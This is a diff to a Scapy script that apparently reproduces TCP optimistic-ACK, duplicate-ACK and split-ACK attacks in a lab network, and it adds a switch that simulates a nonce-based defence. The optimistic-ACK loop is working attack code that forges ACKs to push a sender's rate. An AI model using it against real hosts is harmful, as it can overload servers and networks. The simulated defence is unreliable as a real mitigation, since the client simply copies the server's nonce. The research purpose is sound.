@@ -10,14 +10,20 @@ import threading
 #########################################
 IP_DST = sys.argv[2]
 DST_PORT =  int(sys.argv[3])
+FIX = int(sys.argv[4]) # 0 = no, 1 = yes
+client_nonce = 0
+server_nonce = 0
 
 SRC_PORT = random.randint(1024,65535)
 data = list()
-FileName = "npy/%s.npy" % sys.argv[1]
+File = sys.argv[1]
+if (FIX and (File == 'op' or File == 'normal')):
+  File += '_fix'
+FileName = "npy/%s.npy" % File
 
 ## For Opt attack specifically.
 MTU = 1472 # Default for TCP
-WAIT_TIME = 0.05
+WAIT_TIME = 0.4
 curr_ACK = 0  # For OPT
 curr_SEQ = 0  # For OPT
 count_SEQ = 0 # For DUP
@@ -48,10 +54,13 @@ socket.send(Ether() / request)
 ### Global method definitions.
 ##########################################
 ### Send ACK with sequence no seq and ack num ack.
+## Nonce logic invokes as layer beween client and server.
 def send_ACK(seq, ack):
-  ack_pkt = IP(dst=IP_DST) / TCP(window=65535, dport=DST_PORT, sport=SRC_PORT,
+  global client_nonce, server_nonce
+  if((not FIX) or (FIX and (client_nonce == server_nonce))):
+    ack_pkt = IP(dst=IP_DST) / TCP(window=65535, dport=DST_PORT, sport=SRC_PORT,
              seq=seq, ack=ack, flags='A')
-  socket.send(Ether() / ack_pkt)
+    socket.send(Ether() / ack_pkt)
 
 ### Send ACK with normal sequence progression.
 def send_ACK_in_seq(pkt):
@@ -59,11 +68,14 @@ def send_ACK_in_seq(pkt):
 
 
 ### Function to send ACK used in opt.
+## Assume no access to server-generated nonce here.
 def send_ACK_opt():
   global curr_ACK
-  while (curr_ACK - initialSeq) < MAX_SIZE:
+  while (((curr_ACK - initialSeq) < MAX_SIZE) and ((not FIX) or (FIX and (client_nonce == server_nonce)))):
     curr_ACK += MTU
-    send_ACK(curr_SEQ, curr_ACK)
+    ack_pkt = IP(dst=IP_DST) / TCP(window=65535, dport=DST_PORT, sport=SRC_PORT,
+             seq=curr_SEQ, ack=curr_ACK, flags='A')
+    socket.send(Ether() / ack_pkt)
 
 ## Split ACK across several packets
 def get_split_acks(pkt):
@@ -97,11 +109,16 @@ def data_len(pkt):
 ### Proper handling for packet with normal transmission.
 #########################################################
 def normal(pkt):
+  global client_nonce, server_nonce
   if (check_pkt(pkt)):
     return
   append(pkt)
   send_ACK_in_seq(pkt)
-  
+  ## Assume this is received from the server.
+  randy = random.randint(1,1000)
+  server_nonce +=randy
+  # Nonce also added onto client because we can access it.
+  client_nonce +=randy
 
 
 
@@ -132,9 +149,12 @@ def split(pkt) :
 ### Proper handling for OP attacks.
 #########################################################
 def op(pkt):
+  global client_nonce, server_nonce
   if (check_pkt(pkt)):
     return
   append(pkt)
+  # Assume this is received from server, but ignored.
+  server_nonce += random.randint(1,1000)
   # ACKs being send optimistically, not in response.
 
 ## Special timing stuff for op attack.
@@ -153,7 +173,7 @@ if sys.argv[1] == "normal" :
     sniff(iface="client-eth0", prn=normal, filter="tcp and ip", timeout=4)
 if sys.argv[1] == "dup":
     sniff(iface="client-eth0", prn=dup, filter="tcp and ip", timeout=4)
-if sys.argv[1] == "op" :
+if sys.argv[1] == "op":
     sniff(iface="client-eth0", prn=op, filter="tcp and ip", timeout=4)
 if sys.argv[1] == "split" :
     sniff(iface="client-eth0", prn=split, filter="tcp and ip", timeout=4)
